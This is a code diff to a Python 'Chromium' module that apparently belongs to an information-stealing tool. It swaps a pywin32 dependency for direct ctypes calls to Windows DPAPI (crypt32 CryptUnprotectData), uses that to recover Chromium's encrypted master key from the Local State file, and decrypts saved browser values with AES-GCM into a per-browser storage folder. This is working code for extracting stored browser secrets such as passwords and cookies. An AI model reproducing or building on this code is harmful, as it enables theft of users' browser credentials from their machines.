@@ -6,10 +6,11 @@ from json import loads, dump
 from multiprocessing import Process
 from datetime import datetime, timedelta
 from os import path, makedirs, remove, listdir
+from ctypes import windll, byref, cdll, c_buffer
 
-from Crypto.Cipher import AES
-from win32.win32crypt import CryptUnprotectData
+from Crypto.Cipher.AES import new, MODE_GCM
 
+from ..helpers import DataBlob
 from ..enums.features import Features
 from ..helpers.config import ChromiumConfig
 
@@ -45,10 +46,23 @@ class Chromium(Process):
             makedirs(rf"{self.storage_path}\Browsers\{self.browser_name}")
             self.profiles = self._get_profiles()
 
+    @staticmethod
+    def _crypt_unprotect_data(encrypted_bytes: b64decode, entropy=b''):
+
+        blob = DataBlob()
+
+        if windll.crypt32.CryptUnprotectData(byref(DataBlob(len(encrypted_bytes), c_buffer(encrypted_bytes, len(encrypted_bytes)))), None, byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))), None, None, 0x01, byref(blob)):
+
+            buffer = c_buffer(int(blob.cbData))
+            cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
+            windll.kernel32.LocalFree(blob.pbData)
+
+            return buffer.raw
+
     def _get_key(self):
 
         with open(self.state_path, "r", encoding="utf-8") as state:
-            return CryptUnprotectData(b64decode(loads(state.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
+            return self._crypt_unprotect_data(b64decode(loads(state.read())["os_crypt"]["encrypted_key"])[5:])
 
     @staticmethod
     def _get_datetime(date):
@@ -59,10 +73,10 @@ class Chromium(Process):
             return "Can't decode"
 
     @staticmethod
-    def _decrypt(buff, master_key):
+    def _decrypt(value: bytes, master_key: bytes = None):
 
         try:
-            return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+            return new(master_key, MODE_GCM, value[3:15]).decrypt(value[15:])[:-16].decode()
         except:
             return "Can't decode"
 
